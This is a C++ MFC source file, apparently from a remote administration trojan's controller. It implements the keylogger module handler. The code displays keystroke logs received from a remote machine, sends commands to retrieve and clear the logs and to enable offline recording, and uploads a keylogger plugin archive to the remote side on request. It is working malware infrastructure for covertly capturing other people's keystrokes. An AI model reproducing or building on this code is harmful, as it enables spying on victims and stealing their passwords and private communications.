#include "stdafx.h"
#include "KeybdLogSrv.h"
#include "KeybdLogDlg.h"


CKeybdLogSrv::CKeybdLogSrv(CClientContext*pClient) :
CMsgHandler(pClient)
{
	m_pDlg = NULL;
}


CKeybdLogSrv::~CKeybdLogSrv()
{
}
void CKeybdLogSrv::OnClose(){
	if (m_pDlg){
		if (m_pDlg->m_DestroyAfterDisconnect){
			//窗口先关闭的.
			m_pDlg->DestroyWindow();
			delete m_pDlg;
		}
		else{
			// pHandler先关闭的,那么就不管窗口了
			m_pDlg->m_pHandler = nullptr;
			m_pDlg->PostMessage(WM_KEYBD_LOG_ERROR, (WPARAM)TEXT("Disconnect."));
		}
		m_pDlg = nullptr;
	}
}

void CKeybdLogSrv::OnOpen(){
	m_pDlg = new CKeybdLogDlg(this);
	ASSERT(m_pDlg->Create(IDD_KBD_LOG, CWnd::GetDesktopWindow()));

	m_pDlg->ShowWindow(SW_SHOW);
}

void CKeybdLogSrv::OnGetPlug(){
	//
	TCHAR plugPath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), plugPath, MAX_PATH);
	TCHAR * p = plugPath + lstrlen(plugPath) - 1;
	while (p >= plugPath && *p != '\\') --p;
	ASSERT(p >= plugPath);
	*p = NULL;

	CString FileName(plugPath);
	FileName += "\\keylogger\\plug.zip";

	DWORD dwFileSizeLow = NULL;
	LPVOID lpBuffer = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwRead = 0;

	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE){
		::MessageBox(NULL, TEXT("CKeybdLogSrv::OnGetPlug CreateFile Failed"),
			TEXT("Error"), MB_OK);
		return;
	}

	dwFileSizeLow = GetFileSize(hFile, NULL);
	lpBuffer = VirtualAlloc(NULL, dwFileSizeLow, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBuffer && ReadFile(hFile, lpBuffer, dwFileSizeLow, &dwRead, NULL) &&
		dwRead == dwFileSizeLow){
		SendMsg(KEYBD_LOG_PLUGS, (char*)lpBuffer, dwRead);
	}
	else{
		::MessageBox(NULL, TEXT("CKeybdLogSrv::OnGetPlug ReadFile Failed")
			, TEXT("Error"), MB_OK);
	}

	if (lpBuffer){
		VirtualFree(lpBuffer, dwFileSizeLow, MEM_RELEASE);
		lpBuffer = NULL;
	}
	CloseHandle(hFile);
}


void CKeybdLogSrv::OnReadMsg(WORD Msg,  DWORD dwSize, char*Buffer){
	switch (Msg)
	{
	case KEYBD_LOG_ERROR:
		OnLogError((TCHAR*)Buffer);
		break;
	case KEYBD_LOG_DATA_APPEND:
		OnLogData(Buffer,TRUE);
		break;
	case KEYBD_LOG_DATA_NEW:
		OnLogData(Buffer, FALSE);
		break;
	case KEYBD_LOG_INITINFO:
		OnLogInit(Buffer);
		break;
	case KEYBD_LOG_GETPLUGS:
		OnGetPlug();
		break;
	default:
		break;
	}
}

//数据到来
void CKeybdLogSrv::OnLogData(char*szLog,BOOL Append){
	m_pDlg->SendMessage(WM_KEYBD_LOG_DATA, (WPARAM)szLog, Append);
}

//获取日志
void CKeybdLogSrv::GetLogData(){
	SendMsg(KEYBD_LOG_GET_LOG, 0, 0);
}
//离线记录
void CKeybdLogSrv::SetOfflineRecord(BOOL bOfflineRecord)
{
	SendMsg(KEYBD_LOG_SETOFFLINERCD, (char*)&bOfflineRecord, 1);
}

//
void CKeybdLogSrv::OnLogError(TCHAR*szError){
	m_pDlg->SendMessage(WM_KEYBD_LOG_ERROR, (WPARAM)(szError), 0);
	Close();
}

void CKeybdLogSrv::OnLogInit(char*InitInfo)
{
	bool bOfflineRecord = InitInfo[0];
	m_pDlg->SendMessage(WM_KEYBD_LOG_INIT, bOfflineRecord, 0);
}

void CKeybdLogSrv::CleanLog(){
	SendMsg(KEYBD_LOG_CLEAN, 0, 0);
}